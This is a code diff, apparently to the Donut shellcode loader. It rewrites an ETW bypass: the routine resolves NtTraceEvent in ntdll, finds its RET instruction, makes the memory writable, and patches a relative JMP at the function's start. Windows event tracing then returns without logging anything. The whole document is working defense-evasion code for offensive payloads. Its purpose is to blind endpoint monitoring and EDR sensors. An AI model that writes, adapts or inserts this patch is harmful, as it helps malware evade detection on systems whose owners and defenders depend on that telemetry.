@@ -354,6 +354,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
 }
 #endif
 
+
 #if defined(BYPASS_ETW_A)
 // This is where you may define your own ETW bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
@@ -362,44 +363,65 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 }
 
 #elif defined(BYPASS_ETW_B)
+
 BOOL DisableETW(PDONUT_INSTANCE inst) {
     HMODULE dll;
-    DWORD   len, op, t;
+    DWORD   op, t;
     LPVOID  cs;
+    PVOID   retAddr = NULL;
+    uint8_t *pBytes;
+    int32_t offset;
+    uint8_t patch[5];
 
     // get a handle to ntdll.dll
     dll = xGetLibAddress(inst, inst->ntdll);
 
     // resolve address of EtwEventWrite
     // if not found, return FALSE because it should exist
-    cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
+    cs = xGetProcAddress(inst, dll, inst->ntraceEvent, 0);
     if (cs == NULL) return FALSE;
 
+    // Find the original RET of the function
+    pBytes = (uint8_t*)cs;
+
+  for (int i = 0; i < 32; i++) {
 #ifdef _WIN64
-    // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-
-    DPRINT("Overwriting EtwEventWrite");
-
-    // over write with "ret"
-    Memcpy(cs, inst->etwRet64, 1);
-
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, 1, op, &t);
+        // On x64 (fastcall), the syscall ends with a pure RET (C3)
+        if (pBytes[i] == (uint8_t)inst->etwRet64[0]) { 
+            retAddr = (PVOID)&pBytes[i];
+            break;
+        }
 #else
-    // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-
-    DPRINT("Overwriting EtwEventWrite");
-
-    // over write with "ret 14h"
-    Memcpy(cs, inst->etwRet32, 4);
-
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, 4, op, &t);
+        // On x86/WoW64 (stdcall), NtTraceEvent clears 4 arguments (16 bytes = 0x10)
+        // Ends with RET 10h.
+        if (pBytes[i]   == (uint8_t)inst->etwRet32[0] && 
+            pBytes[i+1] == (uint8_t)inst->etwRet32[1] && 
+            pBytes[i+2] == (uint8_t)inst->etwRet32[2]) {
+            retAddr = (PVOID)&pBytes[i];
+            break;
+        }
 #endif
+    }
+
+    if (retAddr == NULL) return FALSE;
+
+    // Calculate the relative displacement for JMP (E9)
+    // Offset = Destination - Source - 5 (size of the JMP instruction)
+    offset = (int32_t)((ULONG_PTR)retAddr - (ULONG_PTR)cs - 5);
+
+    // Make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(cs, 5, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Patching NtTraceEvent with Tail Jump");
+
+    patch[0] = 0xE9; // Opcode for JMP
+    Memcpy(&patch[1], &offset, 4); // Copy the relational offset
+    
+    // Over write with Tal Jump
+    Memcpy(cs, patch, 5); 
+
+    // Set memory back to original protection
+    inst->api.VirtualProtect(cs, 5, op, &t);
 
     return TRUE;
 
